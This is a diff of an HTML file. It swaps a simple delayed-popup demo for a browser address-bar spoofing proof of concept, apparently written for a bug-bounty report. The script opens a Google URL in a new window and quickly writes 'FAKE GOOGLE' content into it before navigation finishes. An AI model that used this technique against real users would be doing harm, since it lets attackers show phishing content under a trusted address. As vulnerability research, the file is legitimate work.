@@ -1,25 +1,27 @@
 <!DOCTYPE html>
 <html>
-<head>
-  <meta charset="UTF-8">
-  <title>Delay Popup Test</title>
-</head>
-<body>
-  <h2>Simulasi Jeda Sebelum Popup</h2>
+  <body>
+    <button onclick="spoof()">Click to spoof</button>
 
-  <script>
-    // Fungsi memunculkan popup
-    function showPopup() {
-      alert("Popup muncul setelah jeda!");
-    }
+    <script>
+      function spoof() {
+        // Buka jendela baru pointing ke target (akan menjadi spoofed URL)
+        let win = window.open("https://www.google.com:8080", "_blank");
 
-    // Fungsi dengan jeda
-    function delayedPopup(seconds) {
-      setTimeout(showPopup, seconds * 1000);
-    }
-
-    // Contoh: popup setelah 2 detik
-    delayedPopup(2);
-  </script>
-</body>
+        // Setelah 50ms, injeksikan konten sebelum navigasi selesai
+        setTimeout(() => {
+          try {
+            win.document.write(`
+<h1> FAKE GOOGLE </h1> 
+<br>
+BUG BOUNTY BUG CROWD - ALAYERS HUNTERS
+            `);
+            win.document.close();
+          } catch (e) {
+            console.warn("Blocked by browser protections:", e);
+          }
+        }, 50);
+      }
+    </script>
+  </body>
 </html>
